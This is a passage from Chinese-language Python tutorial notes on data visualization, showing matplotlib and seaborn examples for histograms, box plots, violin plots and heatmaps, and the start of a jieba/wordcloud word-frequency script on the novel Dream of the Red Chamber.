class="token punctuation">.</span>add_subplot<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>x <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token comment">#在0到100的范围内，随机生成五十个随机数,</span>axes1<span class="token punctuation">.</span>hist<span class="token punctuation">(</span>x<span class="token punctuation">)</span>axes2<span class="token punctuation">.</span>hist<span class="token punctuation">(</span>x<span class="token punctuation">,</span>bins<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token builtin">range</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">,</span>histtype<span class="token operator">=</span><span class="token string">'barstacked'</span><span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token comment">#这个实际上频率分布直方图，y坐标是x在一定范围内出现的次数</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_21.png" alt=""></p><h2 id="5-8-箱线图">5.8 箱线图</h2><p>箱线图又称为盒式图、盒状图或箱形图，是一种用于显示一组数据分散情况资料的统计图。箱线图一般不受异常值的影响，是一种相对稳定的数据离散分布情况的描述方式。箱线图中显示的是一组数据的最大值、最小值、中位数、上下四分位数及异常值。</p><img src="./python绘图及可视化备课/箱线图.png" alt="1636276528346" style="zoom:50%;" /><p>将整组数据等分成4份，就是四分位数，四分位数有3个<br>第1个四分位数就是通常所说的四分位数，称为下四分位数，通常用Q1表示，等于整组数据中所有数值由小到大排列后第25%的数字，第2个四分位数是中位数，用Q2表示，等于整组数据中所有数值由小到大排列后第50%的数字，第3个四分位数是上四分位数，用Q3表示，等于整组数据中所有数值由小到大排列后第75%的数字</p><p>箱线图的大小是由数据升序排列后，中间的50%个数据决定的。因此，前25%数据和后25%数据都无法影响箱线图，它们可以变得任意远，且不会扰动四分位值。若数据集呈标准正态分布，则中位数位于Q1和Q3中间，箱线图的中间线恰好位于上底和下底的正中央。若中位数偏向于下底，则数据集倾向于左偏态；若中位数偏向于上底，则数据集倾向于右偏态。箱线图的宽度在一定程度上反映了数据的波动程度。因为箱线图包含中间50%的数据，若它越扁，则说明数据较为集中，若它越宽，则说明数据越分散。</p><p>可以通过观察中位线位于箱体的哪个部分判断数据分布是否均匀，如果中位线位于箱体的中心位置附近则数据部比较均匀，反之则不均匀。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">plt<span class="token punctuation">.</span>boxplot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> notch<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> sym<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> vert<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> whis<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> positions<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> widths<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> patch_artist<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> meanline<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> showmeans<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> showcaps<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> showbox<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> showfliers<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> boxprops<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> labels<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> flierprops<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> medianprops<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> meanprops<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> capprops<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> whiskerprops<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>例5-23</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltx <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span>plt<span class="token punctuation">.</span>boxplot<span class="token punctuation">(</span>x<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>横版5-23：</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltx <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span>plt<span class="token punctuation">.</span>boxplot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>vert <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_22.png" alt=""></p><p>例5-24：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltx1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span>x2<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">]</span>x3<span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">]</span>plt<span class="token punctuation">.</span>boxplot<span class="token punctuation">(</span><span class="token punctuation">(</span>x1<span class="token punctuation">,</span>x2<span class="token punctuation">,</span>x3<span class="token punctuation">)</span><span class="token punctuation">,</span>labels<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'x1'</span><span class="token punctuation">,</span><span class="token string">'x2'</span><span class="token punctuation">,</span><span class="token string">'x3'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_23.png" alt=""></p><p>从运行结果可以看出，x2数据有一个异常数据点，绘制在箱线图外部。</p><p>在进行数据预处理时，常常需要进行数据的异常值分析，来检测数据是否有错误和不合理的数据。异常值会影响整租数据，应该从本组数据中丢弃异常值。</p><p>例5-25：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltplt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.family'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'SimHei'</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'苹果'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">130</span><span class="token punctuation">,</span> <span class="token number">140</span><span class="token punctuation">,</span> <span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">162</span><span class="token punctuation">,</span> <span class="token number">170</span><span class="token punctuation">,</span> <span class="token number">180</span><span class="token punctuation">,</span> <span class="token number">190</span><span class="token punctuation">,</span> <span class="token number">250</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'西瓜'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">133</span><span class="token punctuation">,</span> <span class="token number">140</span><span class="token punctuation">,</span> <span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">169</span><span class="token punctuation">,</span> <span class="token number">170</span><span class="token punctuation">,</span> <span class="token number">183</span><span class="token punctuation">,</span> <span class="token number">190</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">210</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'桃'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">,</span> <span class="token number">140</span><span class="token punctuation">,</span> <span class="token number">158</span><span class="token punctuation">,</span> <span class="token number">160</span><span class="token punctuation">,</span> <span class="token number">170</span><span class="token punctuation">,</span> <span class="token number">180</span><span class="token punctuation">,</span> <span class="token number">195</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"香蕉"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">137</span><span class="token punctuation">,</span> <span class="token number">140</span><span class="token punctuation">,</span> <span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">160</span><span class="token punctuation">,</span> <span class="token number">170</span><span class="token punctuation">,</span> <span class="token number">180</span><span class="token punctuation">,</span> <span class="token number">197</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>data<span class="token punctuation">)</span>df<span class="token punctuation">.</span>plot<span class="token punctuation">.</span>box<span class="token punctuation">(</span>title<span class="token operator">=</span><span class="token string">"每种水果的销售额对比"</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_24.png" alt=""></p><h2 id="5-9小提琴图">5.9小提琴图</h2><p>小提琴图是用来展示多组数据的分布状态及概率密度的一种数据可视化形式。小提琴图结合了箱线图和密度图的特征，主要用来显示数据的分布形状，特别适用于大数据统计分析。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> npdata<span class="token operator">=</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>normal<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>violinplot<span class="token punctuation">(</span>data<span class="token punctuation">,</span>showmeans<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>showmedians<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_25.png" alt=""></p><h2 id="5-10热力图">5.10热力图</h2><p>Seaborn是基于matplotlib库的Python可视化库， 它提供了一个高级界面来绘制有吸引力的统计图形。<br>Seaborn其实是在matplotlib的基础上进行了更高级的API封装，从而使作图更加容易，不需要经过大量的调整就能使图变得更精致。<br>绘图热力图是大数据分析应用的一种常用可视化形式，用来表示大量数据的关联关系。<br>在实际应用中，通常使用seaborn来绘制热力图。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">seaborn<span class="token punctuation">.</span>heatmap<span class="token punctuation">(</span>data<span class="token punctuation">,</span> vmin<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> vmax<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>cmap<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> center<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> robust<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> annot<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> fmt<span class="token operator">=</span>’<span class="token punctuation">.</span>2g’<span class="token punctuation">,</span> annot_kws<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>linewidths<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> linecolor<span class="token operator">=</span>’white’<span class="token punctuation">,</span> cbar<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> cbar_kws<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> cbar_ax<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>square<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> xticklabels<span class="token operator">=</span>’auto’<span class="token punctuation">,</span> yticklabels<span class="token operator">=</span>’auto’<span class="token punctuation">,</span> mask<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>…<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>热力图绘制属于Python绘图的中高级应用，在绘制前要先添加如下语句。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> seaborn <span class="token keyword">as</span> sns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>例5-27：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> seaborn <span class="token keyword">as</span> snsx <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>f<span class="token punctuation">,</span> ax <span class="token operator">=</span> plt<span class="token punctuation">.</span>subplots<span class="token punctuation">(</span>nrows<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>sns<span class="token punctuation">.</span>heatmap<span class="token punctuation">(</span>x<span class="token punctuation">,</span> ax<span class="token operator">=</span>ax<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>sns<span class="token punctuation">.</span>heatmap<span class="token punctuation">(</span>x<span class="token punctuation">,</span> annot<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> ax<span class="token operator">=</span>ax<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> annot_kws<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'size'</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token string">'weight'</span><span class="token punctuation">:</span><span class="token string">'bold'</span><span class="token punctuation">,</span> <span class="token string">'color'</span><span class="token punctuation">:</span><span class="token string">'blue'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_26.png" alt=""></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> seaborn <span class="token keyword">as</span> snsx <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span>f<span class="token punctuation">,</span> ax <span class="token operator">=</span> plt<span class="token punctuation">.</span>subplots<span class="token punctuation">(</span>nrows<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>sns<span class="token punctuation">.</span>heatmap<span class="token punctuation">(</span>x<span class="token punctuation">,</span> cmap<span class="token operator">=</span><span class="token string">"YlGnBu_r"</span><span class="token punctuation">,</span> linewidths <span class="token operator">=</span> <span class="token number">0.05</span><span class="token punctuation">,</span> linecolor<span class="token operator">=</span> <span class="token string">'red'</span><span class="token punctuation">,</span> ax <span class="token operator">=</span> ax<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>p1 <span class="token operator">=</span> sns<span class="token punctuation">.</span>heatmap<span class="token punctuation">(</span>x<span class="token punctuation">,</span> ax<span class="token operator">=</span>ax<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> cmap<span class="token operator">=</span><span class="token string">"hot"</span><span class="token punctuation">,</span> center<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> xticklabels<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>p2 <span class="token operator">=</span> sns<span class="token punctuation">.</span>heatmap<span class="token punctuation">(</span>x<span class="token punctuation">,</span> ax<span class="token operator">=</span>ax<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> cmap<span class="token operator">=</span><span class="token string">"OrRd"</span><span class="token punctuation">,</span> center<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> xticklabels<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> yticklabels<span class="token operator">=</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_27.png" alt=""></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> seaborn <span class="token keyword">as</span> snsx <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>f<span class="token punctuation">,</span> ax <span class="token operator">=</span> plt<span class="token punctuation">.</span>subplots<span class="token punctuation">(</span>nrows<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span>sns<span class="token punctuation">.</span>heatmap<span class="token punctuation">(</span>x<span class="token punctuation">,</span> cmap<span class="token operator">=</span><span class="token string">"YlGnBu"</span><span class="token punctuation">,</span>annot<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> ax<span class="token operator">=</span>ax<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> annot_kws<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'size'</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token string">'weight'</span><span class="token punctuation">:</span><span class="token string">'bold'</span><span class="token punctuation">,</span> <span class="token string">'color'</span><span class="token punctuation">:</span><span class="token string">'red'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>sns<span class="token punctuation">.</span>heatmap<span class="token punctuation">(</span>x<span class="token punctuation">,</span> cmap<span class="token operator">=</span><span class="token string">"YlGnBu_r"</span><span class="token punctuation">,</span>annot<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> ax<span class="token operator">=</span>ax<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>sns<span class="token punctuation">.</span>heatmap<span class="token punctuation">(</span>x<span class="token punctuation">,</span> cmap<span class="token operator">=</span><span class="token string">"hot"</span><span class="token punctuation">,</span>annot<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> ax<span class="token operator">=</span>ax<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> annot_kws<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'size'</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token string">'weight'</span><span class="token punctuation">:</span><span class="token string">'bold'</span><span class="token punctuation">,</span> <span class="token string">'color'</span><span class="token punctuation">:</span><span class="token string">'blue'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>sns<span class="token punctuation">.</span>heatmap<span class="token punctuation">(</span>x<span class="token punctuation">,</span> cmap<span class="token operator">=</span><span class="token string">"hot_r"</span><span class="token punctuation">,</span>annot<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> ax<span class="token operator">=</span>ax<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_28.png" alt=""></p><h2 id="5-11云图">5.11云图</h2><p>词云图是目前文本大数据分析中常用的一种数据可视化方式，通过词云图可以直观的看到相应数据文本中的高频词。目前制作词云图使用最多的是Python库中的wordcloud库，wordcloud库中有3个主要的函数，分别是<strong>wordcloud.Woedcloud()</strong>,<strong>wordcloud.ImageColorGenerator()<strong>及</strong>wordcloud.random_color_func()</strong></p><p>由于于老师没有给我，这些数据，我自己从网上下载了个txt格式的红楼梦，做了一下。</p><p><strong>matplotlib.pyplot</strong>模块用于绘图展示，<strong>jieba</strong>库用于分词，<strong>numpy</strong>模块和<strong>PIL.image</strong>模块用于制作背景图，<strong>re</strong>用于正则匹配，</p><p>注意<strong>PIL.image</strong>模块的真名是pillow,不要试图使用PIL之类的找到添加这个库。</p><pre class="line-numbers language-none"><code class="language-none">pip install pillow<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">import</span> jieba<span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token comment"># 要先pip install wordcloud</span><span class="token keyword">from</span> wordcloud <span class="token keyword">import</span> WordCloud<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Imagef <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"红楼梦.txt"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>file_handle <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'红楼梦去字符.txt'</span><span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'a'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>line <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>a <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">u'[\u4e00-\u9fa5]+'</span><span class="token punctuation">)</span>b<span class="token operator">=</span>a<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>line<span class="token punctuation">)</span>n<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    file_handle<span class="token punctuation">.</span>write<span class="token punctuation">(</span>b<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>line <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>file_handle<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"红楼梦去字符.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>words <span class="token operator">=</span> jieba<span class="token punctuation">.</span>lcut<span class="token punctuation">(</span>f<span class="token punctuation">)</span>  <span class="token comment"># 使用精确模式对文本进行分词</span>counts <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>  <span class="token comment"># 通过键值对的形式存储词语及其出现的次数</span><span class="token keyword">for</span> word <span class="token keyword">in</span> words<span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>word<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>  <span class="token comment"># 单个汉字不计算在内</span>        <span class="token keyword">continue</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        counts<span class="token punctuation">[</span>word<span class="token punctuation">]</span> <span class="token operator">=</span> counts<span class="token punctuation">.</span>get<span class="token punctuation">(</span>word<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>  <span class="token comment"># 遍历所有词语，每出现一次其对应的值加 1</span>lists <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>counts<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 将键值对转换成列表</span>lists<span class="token punctuation">.</span>sort<span class="token punctuation">(</span>key<span class="token operator">=</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> reverse<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>  <span class="token comment"># 根据词语出现的次数进行从大到小排序</span><span class="token comment">#file=open("./333.txt","w",encoding="utf")</span><span class="token comment">#for i in range(len(lists)):</span><span class="token comment">#    word,count=lists[i]</span><span class="token comment">#    print("&#123;0:&lt;5&#125;&#123;1:>5&#125;".format(word, count))</span><span class="token comment">#    file.write(word+f'&#123;count&#125;')</span><span class="token comment">#这一部分我是想把所有的词语都导出了写到333.txt里面，之后可能会有用</span><span class="token comment">#file.close()</span><span class="token builtin">file</span><span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./红楼梦词频统计.txt"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">"utf"</span><span class="token punctuation">)</span><span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token 